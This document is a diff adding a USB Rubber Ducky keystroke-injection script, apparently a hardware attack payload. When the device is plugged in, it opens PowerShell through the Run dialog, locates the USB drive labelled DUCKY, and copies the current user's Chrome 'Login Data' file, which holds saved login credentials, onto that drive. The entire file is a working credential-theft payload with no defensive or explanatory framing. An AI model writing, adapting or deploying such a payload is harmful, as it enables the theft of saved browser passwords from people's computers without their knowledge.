@@ -1,0 +1,22 @@
+ATTACKMODE HID STORAGE
+
+GUI r
+DELAY 100
+STRING powershell.exe -NoProfile -NoExit
+ENTER
+DELAY 200
+
+STRING $user=$env:USERNAME
+ENTER
+DELAY 50
+STRING $drive=(Get-Volume -FileSystemLabel "DUCKY").DriveLetter+":"
+ENTER
+DELAY 50
+STRING $src="C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+ENTER
+DELAY 50
+STRING Copy-Item -Path $src -Destination "$drive\LoginDataCopy.db" -Force
+ENTER
+DELAY 50
+STRING Write-Host "Copied to $drive\LoginDataCopy.db"
+ENTER
